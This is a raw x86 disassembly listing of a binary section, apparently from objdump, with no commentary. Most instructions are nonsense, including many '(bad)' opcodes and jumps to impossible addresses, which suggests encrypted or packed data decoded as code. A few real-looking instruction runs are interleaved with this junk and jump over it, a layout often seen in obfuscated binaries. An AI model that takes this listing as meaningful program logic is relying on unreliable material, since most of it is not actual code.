  40b5f6:	jmp    0x588ecc8b
  40b5fb:	push   0x7a41c86a
  40b600:	dec    ecx
  40b601:	scas   al,BYTE PTR es:[edi]
  40b602:	int3   
  40b603:	pop    ebx
  40b604:	sub    DWORD PTR [edx-0x26],0x23a88ac0
  40b60b:	cli    
  40b60c:	or     esi,DWORD PTR [ebx]
  40b60e:	jbe    0x40b62e
  40b610:	xchg   ebx,eax
  40b611:	(bad)  
  40b612:	sbb    DWORD PTR ds:0xc248a5fd,edi
  40b618:	and    al,0x44
  40b61a:	and    eax,0x1061654e
  40b61f:	or     bl,ah
  40b621:	push   0x18218eee
  40b626:	popa   
  40b627:	(bad)  
  40b628:	icebp  
  40b629:	or     al,0xfe
  40b62b:	push   0x246c59ec
  40b630:	jge    0x40b5ff
  40b632:	push   cs
  40b633:	(bad)  
  40b634:	mov    esi,0x8ed7b3f8
  40b639:	outs   dx,BYTE PTR ds:[esi]
  40b63a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b63b:	ror    DWORD PTR [edi],cl
  40b63d:	mov    ds:0x3797fea7,al
  40b642:	mov    edx,0x1468af5
  40b647:	sbb    BYTE PTR [edx-0x5f],bh
  40b64a:	and    bl,BYTE PTR [esi]
  40b64c:	loope  0x40b60a
  40b64e:	idiv   BYTE PTR [edx+0x77]
  40b651:	cmp    al,0x8b
  40b653:	and    eax,0xcb7250a6
  40b658:	adc    eax,0xef998df0
  40b65d:	xor    al,0xab
  40b65f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b660:	or     bl,BYTE PTR [ebx-0x35512477]
  40b666:	popf   
  40b667:	jl     0x40b69d
  40b669:	inc    edi
  40b66a:	jnp    0x40b5f2
  40b66c:	cli    
  40b66d:	dec    ebx
  40b66e:	outs   dx,BYTE PTR ds:[esi]
  40b66f:	rcl    ch,0x1c
  40b672:	xor    bl,cl
  40b674:	(bad)
  40b679:	pop    ebp
  40b67a:	rol    DWORD PTR [ebx],0xfa
  40b67d:	push   ds
  40b67e:	out    0x81,eax
  40b680:	(bad)
  40b684:	mov    al,0x71
  40b686:	imul   esp,DWORD PTR [ebx],0xdd3e1d85
  40b68c:	xchg   edi,eax
  40b68d:	aam    0x53
  40b68f:	push   ebp
  40b690:	imul   edi,DWORD PTR ds:0xd2826451,0x4d5ae291
  40b69a:	mov    bh,0x56
  40b69c:	pop    ecx
  40b69d:	dec    ebp
  40b69e:	adc    ah,BYTE PTR [ebp-0x259eb003]
  40b6a4:	xchg   edi,eax
  40b6a5:	mov    ebp,esi
  40b6a7:	mov    al,gs:0xf01d628d
  40b6ad:	scas   al,BYTE PTR es:[edi]
  40b6ae:	test   eax,0xf0458be7
  40b6b3:	mov    ecx,DWORD PTR [ebp-0x14]
  40b6b6:	xor    ecx,esi
  40b6b8:	mov    edx,0xffcd8d65
  40b6bd:	sub    edx,ecx
  40b6bf:	add    DWORD PTR [eax],edx
  40b6c1:	mov    eax,ds:0x41227c
  40b6c6:	mov    eax,DWORD PTR [eax]
  40b6c8:	jmp    0x40ba15
  40b6cd:	mov    cl,0x1a
  40b6cf:	jns    0x40b704
  40b6d1:	xchg   ecx,eax
  40b6d2:	xor    DWORD PTR [ecx+0x2f888498],esi
  40b6d8:	mov    ch,0xca
  40b6da:	mov    al,0x1a
  40b6dc:	neg    cl
  40b6de:	bnd jle 0x40b75f
  40b6e1:	cs jge 0x40b762
  40b6e4:	jle    0x40b727
  40b6e6:	aas    
  40b6e7:	pop    edi
  40b6e8:	nop
  40b6e9:	xchg   esp,eax
  40b6ea:	out    dx,al
  40b6eb:	and    DWORD PTR [edx+0x60be321b],ebp
  40b6f1:	mov    ch,0x35
  40b6f3:	cmp    ebx,ebp
  40b6f5:	dec    ecx
  40b6f6:	mov    edi,0x8d658a24
  40b6fb:	or     ebx,DWORD PTR [ebx-0x65]
  40b6fe:	jle    0x40b681
  40b700:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b701:	fmul   DWORD PTR [eax-0x74090c11]
  40b707:	xor    al,0xd3
  40b709:	jnp    0x40b6b8
  40b70b:	jmp    0x40b6c7
  40b70d:	ins    BYTE PTR es:[edi],dx
  40b70e:	mov    bl,0x29
  40b710:	or     al,0x48
  40b712:	test   dl,bh
  40b714:	arpl   bp,dx
  40b716:	add    al,0xf2
  40b718:	mov    ebp,0x917a3a55
  40b71d:	jge    0x40b735
  40b71f:	add    al,ah
  40b721:	in     eax,dx
  40b722:	sub    al,0x75
  40b725:	jbe    0x40b76b
  40b727:	pop    esi
  40b728:	bswap  ebp
  40b72a:	and    eax,0x2cf05e2c
  40b72f:	arpl   WORD PTR [esi+0xd8aad61],dx
  40b735:	js     0x40b74e
  40b737:	cmp    eax,0xb69b7af1
  40b73c:	sti    
  40b73d:	es lahf 
  40b73f:	sbb    DWORD PTR ds:0x81d429fa,0x2e
  40b746:	mov    ecx,0xb45ca13d
  40b74b:	stos   BYTE PTR es:[edi],al
  40b74c:	push   ds
  40b74d:	fidiv  WORD PTR [eax+0x42]
  40b750:	das    
  40b751:	sub    al,bh
  40b753:	adc    ch,BYTE PTR [eax+edi*8]
  40b756:	push   0x8a39268d
  40b75b:	in     al,dx
  40b75c:	dec    esi
  40b75d:	mov    bh,0xd3
  40b75f:	bound  ecx,QWORD PTR [ebx]
  40b761:	cli    
  40b762:	jmp    0xa553fa04
  40b767:	clc    
  40b768:	repz push eax
  40b76a:	shl    esi,0x22
  40b76d:	inc    edx
  40b76e:	aas    
  40b76f:	leave  
  40b770:	or     BYTE PTR [esi+0x60f1af3e],bh
  40b776:	pop    ebx
  40b777:	sbb    eax,DWORD PTR [esi+eiz*8]
  40b77a:	scas   al,BYTE PTR es:[edi]
  40b77b:	mov    cl,0xc2
  40b77d:	call   0xb66f:0x341523df
  40b784:	arpl   sp,ax
  40b786:	jmp    0xd6be66bc
  40b78b:	ins    DWORD PTR es:[edi],dx
  40b78c:	inc    esp
  40b78d:	ror    bl,1
  40b78f:	sub    al,0x8a
  40b791:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b792:	scas   eax,DWORD PTR es:[edi]
  40b793:	sti    
  40b794:	ret    0xf86c
  40b797:	imul   edx,DWORD PTR [eax],0xe159204d
  40b79d:	test   BYTE PTR [edx],ah
  40b79f:	mov    ch,0xc6
  40b7a1:	inc    edx
  40b7a2:	(bad)  
  40b7a4:	mov    dl,0x40
  40b7a6:	shl    BYTE PTR [ebp-0x72],0xef
  40b7aa:	cmp    al,0xfb
  40b7ac:	out    0x21,eax
  40b7ae:	xchg   ebx,eax
  40b7af:	mov    al,ds:0xcbeab132
  40b7b4:	out    0x2d,eax
  40b7b6:	sbb    esi,DWORD PTR [edx]
  40b7b8:	mov    dl,0x52
  40b7ba:	jecxz  0x40b7f9
  40b7bc:	dec    ebx
  40b7bd:	adc    cl,ah
  40b7bf:	sub    bl,ah
  40b7c1:	sbb    DWORD PTR [esi],esp
  40b7c3:	pop    ebp
  40b7c4:	mov    dl,0xc5
  40b7c6:	mov    al,0x7e
  40b7c8:	popf   
  40b7c9:	pop    ecx
  40b7ca:	mov    bh,0x6c
  40b7cc:	pop    es
  40b7cd:	nop
  40b7ce:	cmc    
  40b7cf:	pop    es
  40b7d0:	paddusb mm7,mm6
  40b7d3:	xchg   edx,eax
  40b7d4:	mov    fs,WORD PTR [ebx]
  40b7d6:	lods   eax,DWORD PTR ds:[esi]
  40b7d7:	jg     0x40b7c0
  40b7d9:	retf   
  40b7da:	ins    DWORD PTR es:[edi],dx
  40b7db:	push   ebx
  40b7dc:	sbb    eax,0x9fd99c97
  40b7e1:	mov    dh,0x51
  40b7e3:	loopne 0x40b826
  40b7e5:	jmp    0x730e:0x43c52c1f
  40b7ec:	test   DWORD PTR [edx+edi*8],esi
  40b7ef:	lods   al,BYTE PTR ds:[esi]
  40b7f0:	jle    0x40b844
  40b7f2:	mov    esp,0xdf1362ae
  40b7f7:	jle    0x40b7af
  40b7f9:	push   edx
  40b7fa:	or     ch,BYTE PTR [ebp+0x37]
  40b7fd:	aaa    
  40b7fe:	cld    
  40b7ff:	dec    ebp
  40b800:	int3   
  40b801:	iret   
  40b802:	push   0xffffffcb
  40b804:	jb     0x40b80b
  40b806:	pop    edx
  40b807:	mov    ebp,0x26c24b2b
  40b80c:	mov    ecx,DWORD PTR [edx]
  40b80e:	xchg   edi,eax
  40b80f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b810:	mov    eax,fs
  40b812:	repnz outs dx,BYTE PTR ds:[esi]
  40b814:	xlat   BYTE PTR ds:[ebx]
  40b815:	scas   al,BYTE PTR es:[edi]
  40b816:	(bad)
  40b81a:	push   ebp
  40b81b:	cdq    
  40b81c:	mov    ds:0x254ab360,al
  40b821:	adc    ecx,DWORD PTR [ebx]
  40b823:	mov    ch,0xe1
  40b825:	repz push ecx
  40b827:	aad    0xab
  40b829:	lahf   
  40b82a:	sub    DWORD PTR [ebx],esp
  40b82c:	inc    edx
  40b82d:	cwde   
  40b82e:	pushf  
  40b82f:	ja     0x40b825
  40b831:	out    0x6c,eax
  40b833:	pushf  
  40b834:	jle    0x40b7cb
  40b836:	jl     0x40b7f8
  40b838:	dec    edi
  40b839:	int    0x51
  40b83b:	dec    eax
  40b83c:	test   al,0xa8
  40b83e:	push   ss
  40b83f:	(bad)  
  40b840:	enter  0xa20e,0xbf
  40b844:	inc    eax
  40b845:	adc    ecx,DWORD PTR [edi]
  40b847:	push   ebp
  40b848:	test   DWORD PTR [ecx],eax
  40b84a:	add    al,0x3e
  40b84c:	xchg   esi,eax
  40b84d:	ja     0x40b855
  40b84f:	scas   eax,DWORD PTR es:[edi]
  40b850:	jg     0x40b8a1
  40b852:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b853:	or     ecx,esi
  40b855:	out    0x14,al
  40b857:	push   es
  40b858:	push   esi
  40b859:	sbb    DWORD PTR [ecx+ebp*2+0x0],edi
  40b85d:	in     eax,0xf9
  40b85f:	ficom  WORD PTR [eax+eax*8]
  40b862:	retf   0x4569
  40b865:	ds call 0x3b4c:0xbe10d9f9
  40b86d:	sub    esp,DWORD PTR [eax+0x58b871ad]
  40b873:	add    cl,al
  40b875:	enter  0x8140,0xba
  40b879:	cmp    ebp,DWORD PTR [eax-0x75e15fa3]
  40b87f:	icebp  
  40b880:	sahf   
  40b881:	xor    eax,0xe3f6cbef
  40b886:	data16 test BYTE PTR [ebp+0x5b],cl
  40b88a:	out    0x8d,eax
  40b88c:	aaa    
  40b88d:	(bad)
  40b890:	mov    BYTE PTR [edi-0x65e1eafc],dl
  40b896:	ret    
  40b897:	ret    0x657a
  40b89a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b89b:	outs   dx,BYTE PTR ds:[esi]
  40b89c:	push   edx
  40b89d:	xchg   edx,eax
  40b89e:	mov    bh,0x4c
  40b8a0:	das    
  40b8a1:	(bad)  
  40b8a2:	ins    BYTE PTR es:[edi],dx
  40b8a3:	xor    eax,0x5dde1f1f
  40b8a8:	ins    DWORD PTR es:[edi],dx
  40b8a9:	xor    BYTE PTR [ecx+0x1],ch
  40b8ac:	sub    eax,DWORD PTR [ecx-0x77]
  40b8af:	pop    ebp
  40b8b0:	pop    eax
  40b8b1:	xchg   DWORD PTR [edx-0x1c],ecx
  40b8b4:	imul   ebp,DWORD PTR fs:[edi-0x62],0x54
  40b8b9:	fs sbb al,0x4a
  40b8bc:	mov    edx,0xed9aea1a
  40b8c1:	jmp    0xfa348cfb
  40b8c6:	and    dh,BYTE PTR [esi]
  40b8c8:	aad    0xc8
  40b8ca:	cli    
  40b8cb:	(bad)
  40b8ce:	retf   0xf185
  40b8d1:	jmp    0x1b7f9bed
  40b8d6:	and    ch,cl
  40b8d8:	sti    
  40b8d9:	mov    dh,ah
  40b8db:	inc    ebx
  40b8dc:	push   edi
  40b8dd:	lea    ebx,[ebp-0x17]
  40b8e0:	or     DWORD PTR [ecx+0x50179c4],eax
  40b8e6:	retf   0xf172
  40b8e9:	div    DWORD PTR [esi-0x62]
  40b8ec:	jns    0x2781c37
  40b8f2:	push   edi
  40b8f3:	add    BYTE PTR [eax+0x692d65a9],al
  40b8f9:	aas    
  40b8fa:	jle    0x40b8f9
  40b8fc:	les    eax,FWORD PTR ds:0x77cec9d9
  40b902:	repz push esi
  40b904:	push   es
  40b905:	pop    es
  40b906:	cmp    bl,bl
  40b908:	mov    edx,edx
  40b90a:	iret   
  40b90b:	imul   ebp,DWORD PTR [edx],0x352d0e3b
  40b911:	in     al,0x41
  40b913:	mov    bl,0xce
  40b915:	xor    eax,DWORD PTR [ecx]
  40b917:	pushf  
  40b918:	mov    edi,0xc864b9e9
  40b91d:	inc    edx
  40b91e:	cwde   
  40b91f:	leave  
  40b920:	or     eax,0xa5a95dd0
  40b925:	mov    BYTE PTR [esi+0x3e8ec49b],dl
  40b92b:	cmp    DWORD PTR ds:0x6e559bd8,eax
  40b931:	jge    0x40b976
  40b933:	mov    cl,0x57
  40b935:	jnp    0xf1f9158e
  40b93b:	loopne 0x40b95e
  40b93d:	mov    ds:0xfaaf7e46,eax
  40b942:	(bad)  
  40b943:	xchg   ecx,eax
  40b944:	sub    eax,0x16e5e8e
  40b949:	ret    0xcd56
  40b94c:	cmc    
  40b94d:	jnp    0x40b8ef
  40b94f:	xor    al,0xbf
  40b951:	in     al,0xcb
  40b953:	pop    ebp
  40b954:	or     DWORD PTR [eax],eax
  40b956:	scas   eax,DWORD PTR es:[edi]
  40b957:	(bad)  
  40b958:	loopne 0x40b9d8
  40b95a:	(bad)  
  40b95b:	pop    ebp
  40b95c:	je     0x40b975
  40b95e:	mov    bh,0xbc
  40b960:	ret    
  40b961:	add    ebp,DWORD PTR [ebp-0x1d6ee779]
  40b967:	mov    ecx,0x17dd80aa
  40b96c:	(bad)  
  40b96d:	mov    ds:0x678a140,al
  40b972:	inc    ebx
  40b973:	inc    ebp
  40b974:	int    0x93
  40b976:	dec    esi
  40b977:	mov    edx,0xac870155
  40b97c:	jp     0x40b91c
  40b97e:	mov    edi,0x2407375c
  40b983:	adc    al,0xa6
  40b985:	xchg   esp,eax
  40b986:	and    eax,0xad1992d5
  40b98b:	fst    QWORD PTR [ebx]
  40b98d:	xchg   esi,eax
  40b98e:	cdq    
  40b98f:	sub    BYTE PTR [esp+esi*1-0x70e529c4],dh
  40b996:	in     eax,dx
  40b997:	mov    ebx,0xa16e31ed
  40b99c:	cwde   
  40b99d:	jge    0x40b9a9
  40b99f:	(bad)  
  40b9a0:	cmp    al,BYTE PTR [eax+0x1f]
  40b9a3:	lahf   
  40b9a4:	(bad)  
  40b9a6:	fld    TBYTE PTR [esi+0x73163edd]
  40b9ac:	push   cs
  40b9ad:	sbb    al,0x94
  40b9af:	inc    edx
  40b9b0:	or     dh,ch
  40b9b2:	cdq    
  40b9b3:	push   esi
  40b9b4:	in     al,dx
  40b9b5:	inc    edx
  40b9b6:	repnz loopne 0x40b9eb
  40b9b9:	jne    0x40b977
  40b9bb:	cdq    
  40b9bc:	pop    ds
  40b9bd:	scas   al,BYTE PTR es:[edi]
  40b9be:	test   eax,0x673099ef
  40b9c3:	fs or  eax,0x781184b9
  40b9c9:	jb     0x40b976
  40b9cb:	inc    edx
  40b9cc:	add    al,0xb7
  40b9ce:	rcl    DWORD PTR [ebx],1
  40b9d0:	icebp  
  40b9d1:	lock sbb BYTE PTR ds:0x842d097f,bl
  40b9d8:	inc    edx
  40b9d9:	mov    cl,0x59
  40b9db:	inc    edx
  40b9dc:	inc    eax
  40b9dd:	sub    ebp,DWORD PTR [esi+0x44]
  40b9e0:	popa   
  40b9e1:	mov    edi,0x2baae7b2
  40b9e6:	stos   DWORD PTR es:[edi],eax
  40b9e7:	or     cl,BYTE PTR [ecx]
  40b9e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9ea:	call   0xe4690abd
  40b9ef:	push   ds
  40b9f0:	out    dx,al
  40b9f1:	fisub  DWORD PTR [eax+0x72]
  40b9f4:	popf   
  40b9f5:	into   
  40b9f6:	or     eax,0x61c35279
  40b9fb:	push   edx
  40b9fc:	xchg   DWORD PTR [edx-0x122da240],edi
  40ba02:	repnz out 0x38,al
  40ba05:	xor    eax,ebx
  40ba07:	dec    ebp
  40ba08:	dec    esi
  40ba09:	retf   0x7aeb
  40ba0c:	lds    edx,FWORD PTR [esi]
  40ba0e:	and    ecx,esp
  40ba10:	sbb    eax,0x356ac177
  40ba15:	mov    cx,WORD PTR [ebp-0x4]
  40ba19:	movzx  ecx,cx
  40ba1c:	add    ecx,DWORD PTR [eax]
  40ba1e:	mov    DWORD PTR [ebp-0x1c],ecx
  40ba21:	mov    eax,DWORD PTR [ebp+0xc]
  40ba24:	jmp    0x40bd71
  40ba29:	jae    0x40ba29
  40ba2b:	push   ebx
  40ba2c:	lahf   
  40ba2d:	jae    0x40baa2
  40ba2f:	jae    0x40ba83
  40ba31:	pop    edi
  40ba32:	dec    ebp
  40ba33:	scas   al,BYTE PTR es:[edi]
  40ba34:	in     al,dx
  40ba35:	int    0xe2
  40ba37:	imul   edi,DWORD PTR [ecx-0x77],0x2e7e7ef1
  40ba3e:	jge    0x40babe
  40ba40:	jle    0x40ba04
  40ba42:	fadd   QWORD PTR [eax]
  40ba44:	sub    BYTE PTR gs:[edi-0x38],dh
  40ba48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba49:	dec    edx
  40ba4a:	fst    QWORD PTR [ecx+0x76]
  40ba4d:	push   ebx
  40ba4e:	cdq    
  40ba4f:	lock mov ebp,0xd92f2bd5
  40ba55:	push   es
  40ba56:	out    0xa8,al
  40ba58:	and    dl,BYTE PTR [esi]
  40ba5a:	aaa    
  40ba5b:	fisub  DWORD PTR [edx+0x6a]
  40ba5e:	adc    DWORD PTR [eax+0x71],esp
  40ba61:	jle    0x40baae
  40ba63:	das    
  40ba64:	add    al,0x10
  40ba66:	mov    esp,0x2d1cc1c7
  40ba6b:	pop    ss
  40ba6c:	mov    es,WORD PTR [ebx]
  40ba6e:	stc    
  40ba6f:	inc    eax
  40ba70:	rcl    DWORD PTR [eax+ecx*4],0x28
  40ba74:	cmp    DWORD PTR [esi+eiz*1+0xd],ecx
  40ba78:	lea    ebp,[esi-0x20dd7172]
  40ba7e:	jbe    0x40badc
  40ba80:	ja     0x40bad9
  40ba82:	lods   al,BYTE PTR ds:[esi]
  40ba83:	fstp   DWORD PTR [esi]
  40ba85:	div    BYTE PTR [edi+0x2de55651]
  40ba8b:	stc    
  40ba8c:	pop    esp
  40ba8d:	pushf  
  40ba8e:	in     al,dx
  40ba8f:	mov    ebp,0x22375e33
  40ba94:	call   0xf875:0x2f526f8d
  40ba9b:	cdq    
  40ba9c:	jmp    0x9b01817d
  40baa1:	dec    edx
  40baa2:	loope  0x40ba5a
  40baa4:	and    dh,BYTE PTR [ebp+esi*4+0x38a68d4c]
  40baab:	inc    esp
  40baac:	neg    ebx
  40baae:	mov    ch,0x47
  40bab0:	mov    dh,0x7e
  40bab2:	test   al,0x78
  40bab4:	add    esi,esi
  40bab6:	pusha  
  40bab7:	pop    ecx
  40bab8:	test   al,bh
  40baba:	cld    
  40babb:	call   0x46d4:0x7c4d9a62
  40bac2:	and    al,0x6c
  40bac5:	push   edx
  40bac6:	jb     0x40ba6c
  40bac8:	sbb    BYTE PTR [ebx+esi*4],bh
  40bacb:	(bad)  
  40bace:	xchg   DWORD PTR ss:[edx+eax*1+0x4b],ecx
  40bad3:	arpl   WORD PTR ds:0xaf6ab33d,sp
  40bada:	rol    BYTE PTR [edx-0x2e9d243e],cl
  40bae0:	xor    eax,ecx
  40bae2:	shl    BYTE PTR [ebx+0x26e4fb58],cl
  40bae8:	push   edx
  40bae9:	mov    edi,0xf216166
  40baee:	xchg   esi,eax
  40baef:	sub    DWORD PTR [ecx+edx*2-0x37],ebp
  40baf3:	ins    DWORD PTR es:[edi],dx
  40baf4:	cli    
  40baf5:	in     al,dx
  40baf6:	imul   ebx,ecx,0x4f
  40baf9:	adc    dx,WORD PTR [ebp+0x2a]
  40bafd:	outs   dx,DWORD PTR ds:[esi]
  40bafe:	pop    ss
  40baff:	das    
  40bb00:	sbb    DWORD PTR [esi-0x50],ebp
  40bb03:	mov    esp,0xb2f32689
  40bb08:	pop    esi
  40bb09:	lods   al,BYTE PTR ds:[esi]
  40bb0a:	in     al,dx
  40bb0b:	pop    ebx
  40bb0c:	mov    ah,0x47
  40bb0e:	ss gs retf 
  40bb11:	aas    
  40bb12:	sbb    edx,ebp
  40bb14:	in     eax,0x61
  40bb16:	dec    eax
  40bb17:	ficomp DWORD PTR [ebx]
  40bb19:	adc    BYTE PTR [edx],ch
  40bb1b:	je     0x40bb35
  40bb1d:	push   cs
  40bb1e:	push   cs
  40bb1f:	lods   al,BYTE PTR ds:[esi]
  40bb20:	push   cs
  40bb21:	sub    BYTE PTR [eax],ah
  40bb23:	ror    DWORD PTR [esi],1
  40bb25:	mov    ah,0xdc
  40bb27:	fsubr  st(5),st
  40bb29:	dec    ebx
  40bb2a:	shr    DWORD PTR [ecx-0x674cff5d],cl
  40bb30:	pop    esi
  40bb31:	push   ds
  40bb32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb33:	das    
  40bb34:	das    
  40bb35:	jmp    0x30a7:0xfcfe947c
  40bb3c:	jmp    0x40bbab
  40bb3e:	add    esi,eax
  40bb40:	mov    ah,0x8b
  40bb42:	jbe    0x40bb94
  40bb44:	xor    al,0x45
  40bb46:	jmp    0xb256:0x3c8c4862
  40bb4d:	(bad)
  40bb50:	int    0xe1
  40bb52:	test   eax,0x3c8b1759
  40bb57:	sahf   
  40bb58:	cdq    
  40bb59:	xchg   DWORD PTR [ebp+eiz*2-0x41],ebp
  40bb5d:	test   eax,0x7a833029
  40bb62:	xor    ecx,esi
  40bb64:	jbe    0x40baf5
  40bb66:	out    0x15,eax
  40bb68:	or     DWORD PTR [ebp+0x4b],ebx
  40bb6b:	sub    eax,0x765837d9
  40bb70:	adc    eax,0xdb93a118
  40bb75:	leave  
  40bb76:	or     eax,0xe9e387ef
  40bb7b:	mov    cl,0xaa
  40bb7d:	rcl    ecx,1
  40bb7f:	xchg   eax,edi
  40bb81:	je     0x40bbec
  40bb83:	out    dx,eax
  40bb84:	add    BYTE PTR ds:0xcbc0f850,0xc7
  40bb8b:	inc    esi
  40bb8c:	sbb    DWORD PTR [ecx-0x7eb43aba],esi
  40bb92:	int    0xf8
  40bb94:	jo     0x40bbc8
  40bb96:	cmp    ah,BYTE PTR [edi]
  40bb98:	pop    ebx
  40bb99:	pushf  
  40bb9a:	jge    0x40bb5d
  40bb9c:	cmp    BYTE PTR [edx-0xf],bh
  40bb9f:	les    esi,FWORD PTR [ebp-0x54]
  40bba2:	imul   edi,DWORD PTR [edi-0x4a],0x4c
  40bba6:	and    eax,0x37cbcc50
  40bbab:	pushf  
  40bbac:	or     al,0x24
  40bbae:	(bad)  
  40bbaf:	dec    ebx
  40bbb0:	fwait
  40bbb1:	test   BYTE PTR [esi+0x346253d0],dh
  40bbb7:	push   edx
  40bbb8:	aad    0x3
  40bbba:	sub    eax,0x176c91f1
  40bbbf:	sub    al,0x5b
  40bbc1:	pop    esp
  40bbc2:	cmp    eax,0x79a2952e
  40bbc7:	das    
  40bbc8:	and    edx,DWORD PTR es:[ebx+0x1d]
  40bbcc:	aad    0x74
  40bbce:	jo     0x40bc17
  40bbd0:	aam    0xf
  40bbd2:	mov    ds:0xbc2756ab,al
  40bbd7:	(bad)  
  40bbd8:	mov    ebx,DWORD PTR [eax+ebp*2]
  40bbdb:	rcl    DWORD PTR [esi+0x384595e8],1
  40bbe1:	add    dl,dl
  40bbe3:	lods   al,BYTE PTR ds:[esi]
  40bbe4:	cmp    eax,0x4c
  40bbe7:	fidiv  WORD PTR [ebp+0x2d57a712]
  40bbed:	push   edi
  40bbee:	xchg   ebx,eax
  40bbef:	push   ebx
  40bbf0:	and    al,0x60
  40bbf2:	icebp  
  40bbf3:	ins    BYTE PTR es:[edi],dx
  40bbf4:	inc    edi
  40bbf5:	pop    ds
  40bbf6:	add    ecx,esi
  40bbf8:	int    0x61
  40bbfa:	gs push esp
  40bbfc:	fdiv   DWORD PTR [ebx+eiz*2]
  40bbff:	xlat   BYTE PTR ds:[ebx]
  40bc00:	(bad)
  40bc04:	loopne 0x40bb87
  40bc06:	data16 cmc 
  40bc08:	ds dec eax
  40bc0a:	arpl   WORD PTR [esi],bp
  40bc0c:	pop    ss
  40bc0d:	fld    DWORD PTR [ebx-0x2b9b9b00]
  40bc13:	and    DWORD PTR [si],esp
  40bc16:	push   cs
  40bc17:	ss mov al,0xc
  40bc1a:	inc    esp
  40bc1b:	mov    eax,ds:0x2443fa5d
  40bc20:	lea    edi,[ecx]
  40bc22:	pop    es
  40bc23:	arpl   WORD PTR [edi-0x29084f],si
  40bc29:	cli    
  40bc2a:	into   
  40bc2b:	mov    edx,0x4b863154
  40bc30:	in     al,dx
  40bc31:	mov    bh,0x15
  40bc33:	push   eax
  40bc34:	clc    
  40bc35:	fucomi st,st(5)
  40bc37:	out    0x11,al
  40bc39:	aad    0x6c
  40bc3b:	scas   eax,DWORD PTR es:[edi]
  40bc3c:	jle    0x40bc6c
  40bc3e:	jnp    0x40bc61
  40bc40:	jmp    0x5a84:0x14a10681
  40bc47:	lods   al,BYTE PTR ds:[esi]
  40bc48:	out    dx,eax
  40bc49:	sub    al,0xdc
  40bc4b:	xlat   BYTE PTR ds:[ebx]
  40bc4c:	test   BYTE PTR [eax*8-0x4e0759e0],dh
  40bc53:	arpl   WORD PTR [ecx+ecx*4],cx
  40bc56:	dec    edx
  40bc57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc58:	(bad)  
  40bc59:	pusha  
  40bc5a:	fisubr WORD PTR [ebp+0x4e]
  40bc5d:	cli    
  40bc5e:	sar    BYTE PTR [edi+0x4c],cl
  40bc61:	js     0x40bcb8
  40bc63:	mov    ds:0x2d92b1b3,al
  40bc68:	add    eax,0x2fc30dfb
  40bc6d:	mov    ebp,0x6b22ae1f
  40bc72:	retf   0xe58b
  40bc75:	lds    ebp,FWORD PTR [esp+eax*2-0x14b0c842]
  40bc7c:	pop    ss
  40bc7d:	and    BYTE PTR [eax-0x24e83110],cl
  40bc83:	mov    ds:0x77e4107d,eax
  40bc88:	sbb    DWORD PTR [esi+0x60290aed],eax
  40bc8e:	mov    esp,0x3a7a3f00
  40bc93:	fbstp  TBYTE PTR [ebp+ebx*1-0x60fb83db]
  40bc9a:	cmp    al,0x1a
  40bc9c:	in     eax,0xb4
  40bc9e:	lods   al,BYTE PTR ds:[esi]
  40bc9f:	pop    es
  40bca0:	stos   DWORD PTR es:[edi],eax
  40bca1:	int3   
  40bca2:	sbb    BYTE PTR [ecx+0x4],0x1b
  40bca6:	shl    BYTE PTR [esi],0x94
  40bca9:	sbb    BYTE PTR ds:0xf7ad3fbc,ah
  40bcaf:	fdivr  DWORD PTR [ebp-0x68]
  40bcb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcb3:	xchg   DWORD PTR [ebp-0x63e39627],eax
  40bcb9:	shr    BYTE PTR [ecx+edi*4],1
  40bcbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcbd:	aaa    
  40bcbe:	arpl   WORD PTR [edi+0x5cecc721],sp
  40bcc4:	mov    esp,0x92330196
  40bcc9:	mov    cl,0xfb
  40bccb:	ret    
  40bccc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bccd:	sub    ebx,DWORD PTR [si-0x1c]
  40bcd1:	cmc    
  40bcd2:	mov    WORD PTR [ebp+0x4cbbac5c],?
  40bcd8:	lahf   
  40bcd9:	jmp    DWORD PTR ds:0xe3496b13
  40bcdf:	adc    eax,DWORD PTR [eax+0x687444aa]
  40bce5:	cmc    
  40bce6:	icebp  
  40bce7:	xor    edx,DWORD PTR [eax]
  40bce9:	push   es
  40bcea:	xchg   esi,eax
  40bceb:	sbb    ecx,DWORD PTR [eax-0x5fc0e006]
  40bcf1:	sahf   
  40bcf2:	rcl    BYTE PTR [esi],cl
  40bcf4:	fnstsw WORD PTR [edi+0x21]
  40bcf7:	xchg   edx,eax
  40bcf8:	ja     0x40bcba
  40bcfa:	pop    ebp
  40bcfb:	cmp    eax,0xab08e997
  40bd00:	or     BYTE PTR [esp+esi*8],cl
  40bd03:	cdq    
  40bd04:	jb     0x40bc92
  40bd06:	dec    esi
  40bd07:	sub    cl,dl
  40bd09:	das    
  40bd0a:	and    BYTE PTR [esi],bh
  40bd0c:	inc    ebx
  40bd0d:	dec    edi
  40bd0e:	mov    ds:0x4fe1365d,al
  40bd13:	idiv   dh
  40bd15:	xchg   edi,eax
  40bd16:	xchg   edi,eax
  40bd17:	pop    esp
  40bd18:	jp     0x40bd0e
  40bd1a:	push   es
  40bd1b:	or     eax,0x6e39991d
  40bd20:	sbb    BYTE PTR [esi-0x76],ch
  40bd23:	fs out 0xa0,eax
  40bd26:	pop    ebp
  40bd27:	inc    esp
  40bd28:	popa   
  40bd29:	xor    eax,DWORD PTR [ebx+0x33]
  40bd2c:	pop    esp
  40bd2d:	add    al,0x84
  40bd2f:	ins    DWORD PTR es:[edi],dx
  40bd30:	jbe    0x40bd8f
  40bd32:	repnz mov edx,0xc3aeb845
  40bd38:	xchg   ebx,eax
  40bd39:	jl     0x40bd5d
  40bd3b:	sub    DWORD PTR [esi],ebx
  40bd3d:	xchg   esi,eax
  40bd3e:	dec    ebx
  40bd3f:	(bad)  
  40bd40:	stos   DWORD PTR es:[edi],eax
  40bd41:	cli    
